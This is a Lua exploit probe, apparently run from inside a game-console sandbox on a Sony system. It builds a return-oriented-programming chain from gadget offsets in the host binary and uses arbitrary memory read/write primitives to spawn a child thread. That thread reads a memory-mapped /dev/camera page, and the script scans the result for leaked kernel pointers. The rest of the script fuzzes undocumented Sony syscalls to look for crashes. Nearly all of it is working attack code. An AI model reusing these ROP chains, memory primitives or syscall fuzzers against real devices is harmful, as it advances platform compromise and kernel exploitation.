-- CRASH_CLASS: HIGH
-- PROBE 93d9: camera mmap child read + Sony syscall deep fuzz
--
-- A) mmap /dev/camera R, then read from child thread via socketpair
--    Child reads camera page, writes summary to socketpair, parent reads
-- B) Deep-fuzz Sony syscalls 596/585/606/640 with structured pointer args
-- C) Try sys 572 with new arg patterns (VM info)

print("=== PROBE 93d9: CAMERA + SONY FUZZ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Get eboot base
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)
local prc_lo, prc_hi = eoff(0xE64)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x100)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        local a1_lo, a1_hi = split(c[2] or 0)
        local a2_lo, a2_hi = split(c[3] or 0)
        local a3_lo, a3_hi = split(c[4] or 0)
        local a4_lo, a4_hi = split(c[5] or 0)
        local a5_lo, a5_hi = split(c[6] or 0)
        put(pdr_lo, pdr_hi); put(a1_lo, a1_hi)
        put(psr_lo, psr_hi); put(a2_lo, a2_hi)
        put(prdx_lo, prdx_hi); put(a3_lo, a3_hi)
        put(prc_lo, prc_hi); put(a4_lo, a4_hi)
        put(pr8_lo, pr8_hi); put(a5_lo, a5_hi)
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xDEAD93D9, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(da, max)
    for w = 1, (max or 100000) do
        local df = rd(da)
        if df and df ~= 0 then return true end
    end
    return false
end

-- ======== SECTION A: Camera mmap + child read ========
print("--- A: /dev/camera mmap child read ---")

-- Open camera
local cam_path = memory.alloc(32)
local cp = "/dev/camera"
for i = 1, #cp do wd(N(cam_path) + i - 1, string.byte(cp, i)) end
wd(N(cam_path) + #cp, 0)
local ok_c, rv_c = pcall(function() return mk(5)(cam_path, uint64(0)) end)
local cam_fd = ok_c and N(rv_c) or -1
print("camera_fd=" .. cam_fd)

if cam_fd >= 0 then
    -- mmap PROT_READ, MAP_SHARED
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(cam_fd), uint64(0))
    end)

    if ok_m then
        local cam_lo, cam_hi = split(rv_m)
        if cam_hi > 0 or cam_lo > 0x1000 then
            print(string.format("camera_mmap=0x%08X%08X", cam_hi, cam_lo))

            -- Create socketpair for child to report back
            local sv = memory.alloc(16)
            wd(N(sv), 0); wd(N(sv) + 4, 0)
            local ok_sp, rv_sp = pcall(function()
                return mk(135)(uint64(1), uint64(2), uint64(0), sv)
            end)
            local sp_ret = ok_sp and N(rv_sp) or -1
            local fd0 = rd(N(sv)) or -1
            local fd1 = rd(N(sv) + 4) or -1
            print(string.format("socketpair: ret=%d fds=%d,%d", sp_ret, fd0, fd1))

            if sp_ret == 0 and fd0 >= 0 and fd1 >= 0 then
                -- Result buffer: child will write summary here
                local result = memory.alloc(256)
                for i = 0, 252, 4 do wd(N(result) + i, 0xAAAAAAAA) end

                -- Child: read 64 bytes from camera mmap into result buf,
                -- then write 8 bytes to socketpair fd1
                -- We use mov [rdi], rax; ret to copy values
                -- Actually simpler: child does write(fd1, camera_addr, 64)
                local done1 = memory.alloc(8); wd(N(done1), 0)
                local calls = {
                    -- write(fd1, camera_addr, 64) - sends raw camera bytes
                    {4, fd1, cam_lo, 64, 0, 0},
                }

                local spawned = spawn_child(calls, N(done1))
                print("child_spawned=" .. tostring(spawned))

                wait_done(N(done1), 200000)

                if alive() then
                    -- Read from fd0 what the child sent
                    local recv_buf = memory.alloc(128)
                    for i = 0, 124, 4 do wd(N(recv_buf) + i, 0xBBBBBBBB) end
                    local ok_r, rv_r = pcall(function()
                        return mk(3)(uint64(fd0), uint64(N(recv_buf)), uint64(64))
                    end)
                    local read_ret = ok_r and N(rv_r) or -999
                    if read_ret >= 0x80000000 then read_ret = read_ret - 0x100000000 end
                    print(string.format("read_from_child: ret=%d", read_ret))

                    if read_ret > 0 then
                        -- Scan received data for kernel pointers
                        local kptrs = 0
                        local nonzero = 0
                        for off = 0, math.min(read_ret - 4, 60), 4 do
                            local lo = rd(N(recv_buf) + off) or 0
                            local hi = rd(N(recv_buf) + off + 4) or 0
                            if lo < 0 then lo = lo + 0x100000000 end
                            if hi < 0 then hi = hi + 0x100000000 end
                            if lo ~= 0 or hi ~= 0 then nonzero = nonzero + 1 end
                            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                                kptrs = kptrs + 1
                                print(string.format("  [KPTR] +0x%02X: 0x%08X%08X", off, hi, lo))
                            end
                        end
                        print(string.format("  nonzero=%d kptrs=%d", nonzero, kptrs))
                    end
                else
                    print("  CHILD KILLED PROCESS reading camera mmap")
                end

                pcall(function() mk(6)(uint64(fd0)) end)
                pcall(function() mk(6)(uint64(fd1)) end)
            end

            pcall(function() mk(73)(rv_m, uint64(0x4000)) end)
        else
            print("camera mmap returned MAP_FAILED")
        end
    end
    pcall(function() mk(6)(uint64(cam_fd)) end)
end

if not alive() then print("DEAD after camera!"); return end

-- ======== SECTION B: Sony syscall deep fuzz ========
print("")
print("--- B: Sony syscall deep fuzz ---")

-- sys 596: unknown, returns -1 for zeros
-- Try with output buffer pointer, various cmd values
local out = memory.alloc(0x200)
for cmd = 0, 20 do
    for i = 0, 0x1F8, 4 do wd(N(out) + i, 0xEEEE0000 + cmd) end
    local ok_f, rv_f = pcall(function()
        return mk(596)(uint64(cmd), uint64(N(out)), uint64(0x100), uint64(0), uint64(0))
    end)
    local fret = ok_f and N(rv_f) or -999
    if fret >= 0x80000000 then fret = fret - 0x100000000 end
    -- Check if output changed
    local changed = 0
    for off = 0, 0xFC, 4 do
        local v = rd(N(out) + off)
        if v and v ~= (0xEEEE0000 + cmd) then changed = changed + 1 end
    end
    if fret ~= -1 or changed > 0 then
        print(string.format("  596(cmd=%d, out, 0x100): ret=%d changed=%d", cmd, fret, changed))
    end
end

-- sys 585: try with pid arg + output buffer
for _, pid in ipairs({0, 1, pid_val}) do
    for i = 0, 0x1F8, 4 do wd(N(out) + i, 0xDDDD0000) end
    local ok_f, rv_f = pcall(function()
        return mk(585)(uint64(pid), uint64(N(out)), uint64(0x100), uint64(0), uint64(0))
    end)
    local fret = ok_f and N(rv_f) or -999
    if fret >= 0x80000000 then fret = fret - 0x100000000 end
    local changed = 0
    for off = 0, 0xFC, 4 do
        local v = rd(N(out) + off)
        if v and v ~= 0xDDDD0000 then changed = changed + 1 end
    end
    if fret ~= -1 or changed > 0 then
        print(string.format("  585(pid=%d, out, 0x100): ret=%d changed=%d", pid, fret, changed))
    end
end

-- sys 606: try with various subcmds
for cmd = 0, 30 do
    for i = 0, 0x1F8, 4 do wd(N(out) + i, 0xFFFF0000 + cmd) end
    local ok_f, rv_f = pcall(function()
        return mk(606)(uint64(cmd), uint64(N(out)), uint64(0x100), uint64(pid_val), uint64(0))
    end)
    local fret = ok_f and N(rv_f) or -999
    if fret >= 0x80000000 then fret = fret - 0x100000000 end
    local changed = 0
    for off = 0, 0xFC, 4 do
        local v = rd(N(out) + off)
        if v and v ~= (0xFFFF0000 + cmd) then changed = changed + 1 end
    end
    if fret ~= -1 or changed > 0 then
        print(string.format("  606(cmd=%d, out, 0x100, pid): ret=%d changed=%d", cmd, fret, changed))
    end
    if not alive() then break end
end

-- sys 640: try with module handles + various subcmds
for cmd = 0, 15 do
    for i = 0, 0x1F8, 4 do wd(N(out) + i, 0xABCD0000 + cmd) end
    local ok_f, rv_f = pcall(function()
        return mk(640)(uint64(cmd), uint64(0), uint64(N(out)), uint64(0x100), uint64(0))
    end)
    local fret = ok_f and N(rv_f) or -999
    if fret >= 0x80000000 then fret = fret - 0x100000000 end
    local changed = 0
    for off = 0, 0xFC, 4 do
        local v = rd(N(out) + off)
        if v and v ~= (0xABCD0000 + cmd) then changed = changed + 1 end
    end
    if fret ~= -1 or changed > 0 then
        print(string.format("  640(cmd=%d, 0, out, 0x100): ret=%d changed=%d", cmd, fret, changed))
    end
    if not alive() then break end
end

if not alive() then print("DEAD after fuzz!"); return end

-- ======== SECTION C: sys 572 new arg patterns ========
print("")
print("--- C: sys 572 VM info new patterns ---")

-- Previous tests used (addr, outbuf, size) and (outbuf, cmd, size)
-- Try: (outbuf, size, cmd) and (cmd, addr, outbuf, size)
for cmd = 0, 10 do
    for i = 0, 0x1F8, 4 do wd(N(out) + i, 0x99990000 + cmd) end
    -- Pattern: (cmd, outbuf, size, 0, 0)
    local ok_f, rv_f = pcall(function()
        return mk(572)(uint64(cmd), uint64(N(out)), uint64(0x100), uint64(0), uint64(0))
    end)
    local fret = ok_f and N(rv_f) or -999
    if fret >= 0x80000000 then fret = fret - 0x100000000 end
    local changed = 0
    for off = 0, 0xFC, 4 do
        local v = rd(N(out) + off)
        if v and v ~= (0x99990000 + cmd) then changed = changed + 1 end
    end
    if fret ~= -1 or changed > 0 then
        print(string.format("  572(cmd=%d, out, 0x100): ret=%d changed=%d", cmd, fret, changed))
    end
end

-- Try 572 with heap address as target
local heap = memory.alloc(0x100)
for cmd = 0, 5 do
    for i = 0, 0x1F8, 4 do wd(N(out) + i, 0x88880000 + cmd) end
    local ok_f, rv_f = pcall(function()
        return mk(572)(uint64(N(heap)), uint64(cmd), uint64(N(out)), uint64(0x100), uint64(0))
    end)
    local fret = ok_f and N(rv_f) or -999
    if fret >= 0x80000000 then fret = fret - 0x100000000 end
    local changed = 0
    for off = 0, 0xFC, 4 do
        local v = rd(N(out) + off)
        if v and v ~= (0x88880000 + cmd) then changed = changed + 1 end
    end
    if fret ~= -1 or changed > 0 then
        print(string.format("  572(heap, cmd=%d, out, 0x100): ret=%d changed=%d", cmd, fret, changed))
    end
end

print("")
print("alive=" .. tostring(alive()))
print("=== 93d9 COMPLETE ===")
